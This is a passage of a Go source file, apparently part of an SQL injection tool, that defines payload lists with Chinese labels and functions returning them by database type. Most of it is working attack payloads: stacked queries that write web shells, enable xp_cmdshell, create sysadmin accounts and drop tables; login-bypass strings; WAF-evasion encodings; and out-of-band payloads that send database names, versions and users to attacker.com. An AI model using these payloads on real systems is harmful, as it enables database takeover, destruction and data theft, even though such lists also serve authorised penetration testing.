	{Raw: "';SELECT 'hacked' INTO OUTFILE '/var/www/html/shell.php';-- -", Description: "堆叠注入-写文件", DB: MySQL, Method: StackedQuery},
}

var stackedQueriesMSSQL = []Payload{
	{Raw: "';EXEC xp_cmdshell 'whoami';--", Description: "堆叠注入-xp_cmdshell", DB: MSSQL, Method: StackedQuery},
	{Raw: "';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--", Description: "堆叠注入-启用xp_cmdshell", DB: MSSQL, Method: StackedQuery},
	{Raw: "';DROP TABLE users;--", Description: "堆叠注入-DROP TABLE", DB: MSSQL, Method: StackedQuery},
	{Raw: "';EXEC xp_dirtree 'C:\\';--", Description: "堆叠注入-列目录", DB: MSSQL, Method: StackedQuery},
	{Raw: "';EXEC xp_fileexist 'C:\\windows\\win.ini';--", Description: "堆叠注入-文件存在检查", DB: MSSQL, Method: StackedQuery},
	{Raw: "';CREATE USER hacker WITH PASSWORD='P@ssw0rd';EXEC sp_addsrvrolemember 'hacker','sysadmin';--", Description: "堆叠注入-创建sysadmin用户", DB: MSSQL, Method: StackedQuery},
	{Raw: `';EXEC sp_makewebtask @outputfile='C:\inetpub\wwwroot\shell.asp',@query='select ''<%execute(request("cmd"))%>'''--`, Description: "堆叠注入-写WebShell", DB: MSSQL, Method: StackedQuery},
	{Raw: "';BACKUP DATABASE master TO DISK='C:\\inetpub\\wwwroot\\backup.asp'--", Description: "堆叠注入-BACKUP写文件", DB: MSSQL, Method: StackedQuery},
	{Raw: "';EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\MSSQLServer\\MSSQLServer','DefaultData'--", Description: "堆叠注入-读注册表", DB: MSSQL, Method: StackedQuery},
	{Raw: "';SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=attacker','SELECT 1')--", Description: "堆叠注入-OPENROWSET外连", DB: MSSQL, Method: StackedQuery},
}

var stackedQueriesOracle = []Payload{
	{Raw: "';BEGIN EXECUTE IMMEDIATE 'CREATE TABLE hack(id NUMBER)';END;--", Description: "堆叠注入-CREATE TABLE", DB: Oracle, Method: StackedQuery},
	{Raw: "';BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'j',job_type=>'EXECUTABLE',job_action=>'/bin/sh',number_of_arguments=>1,enabled=>FALSE);END;--", Description: "堆叠注入-创建计划任务", DB: Oracle, Method: StackedQuery},
	{Raw: "';BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC';END;--", Description: "堆叠注入-提权DBA", DB: Oracle, Method: StackedQuery},
}

var stackedQueriesPostgreSQL = []Payload{
	{Raw: "';CREATE TABLE hack(id int);-- -", Description: "堆叠注入-CREATE TABLE", DB: PostgreSQL, Method: StackedQuery},
	{Raw: "';COPY (SELECT 'hack') TO '/tmp/hack.txt';-- -", Description: "堆叠注入-COPY写文件", DB: PostgreSQL, Method: StackedQuery},
	{Raw: "';DROP TABLE users;-- -", Description: "堆叠注入-DROP TABLE", DB: PostgreSQL, Method: StackedQuery},
}

var fingerprintPayloads = []Payload{
	{Raw: "' UNION SELECT @@version,NULL-- -", Description: "指纹-MySQL版本", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT version(),NULL-- -", Description: "指纹-PostgreSQL版本", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT @@version,NULL--", Description: "指纹-MSSQL版本", DB: MSSQL, Method: UnionBased},
	{Raw: "' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--", Description: "指纹-Oracle版本", DB: Oracle, Method: UnionBased},
	{Raw: "' UNION SELECT sqlite_version(),NULL--", Description: "指纹-SQLite版本", DB: SQLite, Method: UnionBased},
	{Raw: "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -", Description: "指纹-MySQL information_schema检测", DB: MySQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM master..sysdatabases)>0--", Description: "指纹-MSSQL master库检测", DB: MSSQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM pg_tables)>0-- -", Description: "指纹-PostgreSQL pg_tables检测", DB: PostgreSQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM all_tables)>0--", Description: "指纹-Oracle all_tables检测", DB: Oracle, Method: BooleanBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM sqlite_master)>0--", Description: "指纹-SQLite sqlite_master检测", DB: SQLite, Method: BooleanBlind},
}

var inlinePayloads = []Payload{
	{Raw: "' OR '1'='1' -- -", Description: "内联-OR永真", DB: MySQL, Method: InlineQuery},
	{Raw: "admin'-- -", Description: "内联-注释绕过登录", DB: MySQL, Method: InlineQuery},
	{Raw: "admin' #", Description: "内联-井号注释登录", DB: MySQL, Method: InlineQuery},
	{Raw: "' OR 1=1-- -", Description: "内联-数字OR永真", DB: MySQL, Method: InlineQuery},
	{Raw: "') OR ('1'='1", Description: "内联-括号闭合OR", DB: MySQL, Method: InlineQuery},
	{Raw: "\" OR \"1\"=\"1\"-- -", Description: "内联-双引号OR永真", DB: MySQL, Method: InlineQuery},
	{Raw: "admin' OR '1'='1", Description: "内联-用户名OR永真", DB: MySQL, Method: InlineQuery},
	{Raw: "' OR 1=1 LIMIT 1-- -", Description: "内联-LIMIT限制返回", DB: MySQL, Method: InlineQuery},
	{Raw: "' UNION SELECT 'admin','pass'-- -", Description: "内联-UNION伪造登录", DB: MySQL, Method: InlineQuery},
	{Raw: "-1' OR 1=1-- -", Description: "内联-负ID OR永真", DB: MySQL, Method: InlineQuery},
	{Raw: "' OR 'x'='x'#", Description: "内联-井号注释变体", DB: MySQL, Method: InlineQuery},
	{Raw: "\" OR 1=1 LIMIT 1-- -", Description: "内联-双引号LIMIT", DB: MySQL, Method: InlineQuery},
	{Raw: "') UNION SELECT 1,2,3-- -", Description: "内联-括号UNION", DB: MySQL, Method: InlineQuery},
}

var oobPayloads = []Payload{
	{Raw: "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\test')))-- -", Description: "OOB-MySQL SMB UNC路径", DB: MySQL, Method: OutOfBand},
	{Raw: "';DECLARE @q varchar(99);SET @q='\\\\attacker.com\\'+(SELECT DB_NAME());EXEC master..xp_dirtree @q;--", Description: "OOB-MSSQL xp_dirtree", DB: MSSQL, Method: OutOfBand},
	{Raw: "';DECLARE @q varchar(99);SET @q='\\\\attacker.com\\'+(SELECT DB_NAME());EXEC master..xp_subdirs @q;--", Description: "OOB-MSSQL xp_subdirs", DB: MSSQL, Method: OutOfBand},
	{Raw: "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com') FROM dual)--", Description: "OOB-Oracle UTL_INADDR", DB: Oracle, Method: OutOfBand},
	{Raw: "' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual)--", Description: "OOB-Oracle UTL_HTTP", DB: Oracle, Method: OutOfBand},
	{Raw: "' AND (SELECT DBMS_LDAP.INIT((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com',80) FROM dual)--", Description: "OOB-Oracle DBMS_LDAP", DB: Oracle, Method: OutOfBand},
	{Raw: "';COPY (SELECT 'data') TO PROGRAM 'nslookup $(whoami).attacker.com';-- -", Description: "OOB-PostgreSQL COPY PROGRAM", DB: PostgreSQL, Method: OutOfBand},
	{Raw: "' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual)--", Description: "OOB-Oracle UTL_HTTP用户", DB: Oracle, Method: OutOfBand},
	{Raw: "';DECLARE @q varchar(99);SET @q='\\\\attacker.com\\'+(SELECT @@version);EXEC master..xp_dirtree @q;--", Description: "OOB-MSSQL xp_dirtree版本", DB: MSSQL, Method: OutOfBand},
	{Raw: "' AND (SELECT HTTPURITYPE('http://attacker.com/'||banner).GETCLOB() FROM v$version WHERE ROWNUM=1)--", Description: "OOB-Oracle HTTPURITYPE", DB: Oracle, Method: OutOfBand},
	{Raw: "' AND (SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual)--", Description: "OOB-Oracle DBMS_LDAP用户", DB: Oracle, Method: OutOfBand},
}

var wafBypassCommentInline = []Payload{
	{Raw: "'/**/UNION/**/SELECT/**/NULL--", Description: "WAF绕过-内联注释空白", DB: MySQL, Method: UnionBased},
	{Raw: "'/**/OR/**/1=1--", Description: "WAF绕过-内联注释OR", DB: MySQL, Method: InlineQuery},
	{Raw: "'/*!UNION*//*!SELECT*/NULL--", Description: "WAF绕过-版本注释", DB: MySQL, Method: UnionBased},
	{Raw: "'/*!50000UNION*//*!50000SELECT*/NULL--", Description: "WAF绕过-条件版本注释", DB: MySQL, Method: UnionBased},
	{Raw: "'%09UNION%09SELECT%09NULL--", Description: "WAF绕过-TAB替换空格", DB: MySQL, Method: UnionBased},
	{Raw: "'%0AUNION%0ASELECT%0ANULL--", Description: "WAF绕过-换行替换空格", DB: MySQL, Method: UnionBased},
	{Raw: "'%0DUNION%0DSELECT%0DNULL--", Description: "WAF绕过-回车替换空格", DB: MySQL, Method: UnionBased},
	{Raw: "'%0CUNION%0CSELECT%0CNULL--", Description: "WAF绕过-换页替换空格", DB: MySQL, Method: UnionBased},
	{Raw: "'UnIoN SeLeCt NuLl--", Description: "WAF绕过-大小写变换", DB: MySQL, Method: UnionBased},
	{Raw: "'uNIoN sELECt nULL--", Description: "WAF绕过-随机大小写", DB: MySQL, Method: UnionBased},
	{Raw: "'%55NION%53ELECT%4EULL--", Description: "WAF绕过-URL编码", DB: MySQL, Method: UnionBased},
	{Raw: "'%25%35%35NION%25%35%33ELECT%25%34%45ULL--", Description: "WAF绕过-双重URL编码", DB: MySQL, Method: UnionBased},
	{Raw: "'UNION(SELECT(NULL))--", Description: "WAF绕过-括号包裹", DB: MySQL, Method: UnionBased},
	{Raw: "'UNION(SELECT+NOWHERE(NULL))--", Description: "WAF绕过-无意义函数", DB: MySQL, Method: UnionBased},
	{Raw: "'%00' UNION SELECT NULL--", Description: "WAF绕过-Null字节", DB: MySQL, Method: UnionBased},
}

var wafBypassHexEncode = []Payload{
	{Raw: "' UNION SELECT 0x61646d696e,NULL--", Description: "WAF绕过-Hex编码admin", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT CHAR(97,100,109,105,110),NULL--", Description: "WAF绕过-CHAR函数", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT UNHEX('61646d696e'),NULL--", Description: "WAF绕过-UNHEX函数", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT CONV('10',16,10),NULL--", Description: "WAF绕过-CONV进制转换", DB: MySQL, Method: UnionBased},
}

var wafBypassScientificNotation = []Payload{
	{Raw: "' UNION SELECT * FROM users WHERE id=1e0UNION SELECT 1,2,3--", Description: "WAF绕过-科学计数法UNION", DB: MySQL, Method: UnionBased},
	{Raw: "' AND 1=1e0AND 1=1-- -", Description: "WAF绕过-科学计数法AND", DB: MySQL, Method: BooleanBlind},
	{Raw: "' OR 1e0OR 1=1-- -", Description: "WAF绕过-科学计数法OR", DB: MySQL, Method: BooleanBlind},
	{Raw: `-1' OR 2+373-373-1=0+0+0+1--`, Description: "WAF绕过-数学运算代替1=1", DB: MySQL, Method: InlineQuery},
	{Raw: `'-'`, Description: "WAF绕过-单引号减号探测", DB: MySQL, Method: BooleanBlind},
}

var wafBypassWideByte = []Payload{
	{Raw: "%df' UNION SELECT NULL-- -", Description: "WAF绕过-GBK宽字节(GBK)", DB: MySQL, Method: UnionBased},
	{Raw: "%bf' UNION SELECT NULL-- -", Description: "WAF绕过-GBK宽字节(GBK2)", DB: MySQL, Method: UnionBased},
	{Raw: "%aa' OR 1=1-- -", Description: "WAF绕过-宽字节OR永真", DB: MySQL, Method: InlineQuery},
	{Raw: "%df%27 UNION SELECT NULL-- -", Description: "WAF绕过-GBK宽字节URL编码", DB: MySQL, Method: UnionBased},
}

var wafBypassHTTPParam = []Payload{
	{Raw: `' UNION SELECT NULL-- -&id=1`, Description: "WAF绕过-HPP参数拆分", DB: MySQL, Method: UnionBased},
	{Raw: `id=1&id=' UNION SELECT NULL-- -`, Description: "WAF绕过-HPP参数覆盖", DB: MySQL, Method: UnionBased},
}

var wafBypassKeywordSplit = []Payload{
	{Raw: `' UN/**/ION SEL/**/ECT NULL--`, Description: "WAF绕过-关键词拆分注释", DB: MySQL, Method: UnionBased},
	{Raw: `' UNI%4fN SEL%45CT NULL--`, Description: "WAF绕过-关键词部分编码", DB: MySQL, Method: UnionBased},
	{Raw: "' UNI" + string(rune(79)) + "N SELECT NULL--", Description: "WAF绕过-字符拼接", DB: MySQL, Method: UnionBased},
}

var wafBypassBufferOverflow = []Payload{
	{Raw: `' UNION SELECT NULL` + strings.Repeat("A", 5000) + `-- -`, Description: "WAF绕过-超长缓冲区溢出", DB: MySQL, Method: UnionBased},
	{Raw: `' UNION SELECT NULL-- -` + strings.Repeat(" ", 1000), Description: "WAF绕过-尾部空格填充", DB: MySQL, Method: UnionBased},
	{Raw: `' UNION SELECT NULL-- -` + strings.Repeat("\n", 100), Description: "WAF绕过-尾部换行填充", DB: MySQL, Method: UnionBased},
}

var wafBypassEncodingChaining = []Payload{
	{Raw: "' UN/**/ION SE/**/LECT 0x3a,0x3a--", Description: "WAF绕过-多技术组合", DB: MySQL, Method: UnionBased},
	{Raw: "' /*!50000uNIoN*/ /*!50000SeLecT*/ @@version,user()--", Description: "WAF绕过-版本注释+大小写", DB: MySQL, Method: UnionBased},
	{Raw: "' %55nion%09%53elect%09%40%40version--", Description: "WAF绕过-编码+TAB+大小写", DB: MySQL, Method: UnionBased},
}

func ErrorPayloads(db DBType) []Payload {
	switch db {
	case MySQL:
		return errorBasedMySQL
	case PostgreSQL:
		return errorBasedPostgreSQL
	case MSSQL:
		return errorBasedMSSQL
	case Oracle:
		return errorBasedOracle
	case SQLite:
		return errorBasedSQLite
	default:
		return errorBasedMySQL
	}
}

func UnionPayloads(db DBType) []Payload {
	switch db {
	case MySQL:
		return unionBased
	case PostgreSQL:
		return unionBasedPostgreSQL
	case MSSQL:
		return unionBasedMSSQL
	case Oracle:
		return unionBasedOracle
	case SQLite:
		return unionBasedSQLite
	default:
		return unionBased
	}
}

func BooleanPayloads(db DBType) []Payload {
	switch db {
	case MySQL:
		return booleanBlind
	case MSSQL:
		return booleanBlindMSSQL
	case PostgreSQL:
		return booleanBlindPostgreSQL
	case Oracle:
		return booleanBlindOracle
	case SQLite:
		return booleanBlindSQLite
	default:
		return booleanBlind
	}
}

func TimePayloads(db DBType) []Payload {
	switch db {
	case MySQL:
		return timeBlindMySQL
	case PostgreSQL:
		return timeBlindPostgreSQL
	case MSSQL:
		return timeBlindMSSQL
	case Oracle:
		return timeBlindOracle
	case SQLite:
		return timeBlindSQLite
	default:
		return timeBlindMySQL
	}
}

func StackedPayloads(db DBType) []Payload {
	switch db {
	case MySQL:
		return stackedQueries
	case PostgreSQL:
		return stackedQueriesPostgreSQL
	case MSSQL:
		return stackedQueriesMSSQL
	case Oracle:
		return stackedQueriesOracle
	default:
		return stackedQueries
	}
}

func FingerprintPayloads() []Payload {
	return fingerprintPayloads
}

func InlinePayloads() []Payload {
	return inlinePayloads
}

func OOBPayloads() []Payload {
	return oobPayloads
}

func BypassCommentInlinePayloads() []Payload {
	return wafBypassCommentInline
}

func BypassHexEncodePayloads() []Payload {
	return wafBypassHexEncode
}

func BypassPayloads(t BypassType) []Payload {
	switch t {
	case BypassCommentInline:
		return wafBypassCommentInline
	case BypassHexEncode:
		return wafBypassHexEncode
	case BypassCaseVary:
		return wafBypassCommentInline[:2]
	case BypassDoubleURL:
		return []Payload{{Raw: "'%25%35%35NION%25%35%33ELECT%25%34%45ULL--", Description: "双重URL编码", DB: MySQL, Method: UnionBased}}
	case BypassWhitespace:
		return wafBypassCommentInline[:4]
	case BypassNullByte:
		return wafBypassCommentInline[13:15]
	case BypassKeywordSplit:
		return wafBypassKeywordSplit
	case BypassHTTPParam:
		return wafBypassHTTPParam
	default:
		return wafBypassCommentInline
	}
}

func OrderByPayloads() []Payload {
	return orderByPayloads
}

func LimitPayloads() []Payload {
	return limitPayloads
}

func BypassScientificNotationPayloads() []Payload {
	return wafBypassScientificNotation
}

func BypassWideBytePayloads() []Payload {
	return wafBypassWideByte
}

func BypassHTTPParamPayloads() []Payload {
	return wafBypassHTTPParam
}

func BypassKeywordSplitPayloads() []Payload {
	return wafBypassKeywordSplit
}

func BypassBufferOverflowPayloads() []Payload {
	return wafBypassBufferOverflow
}

func BypassEncodingChainingPayloads() []Payload {
	return wafBypassEncodingChaining
}

func AllPayloads(db DBType) map[Method][]Payload {
	return map[Method][]Payload{
		ErrorBased:   ErrorPayloads(db),
		UnionBased:   UnionPayloads(db),
		BooleanBlind: BooleanPayloads(db),
		TimeBlind:    TimePayloads(db),
		StackedQuery: StackedPayloads(db),
		InlineQuery:  InlinePayloads(),
		OutOfBand:    OOBPayloads(),
	}
}
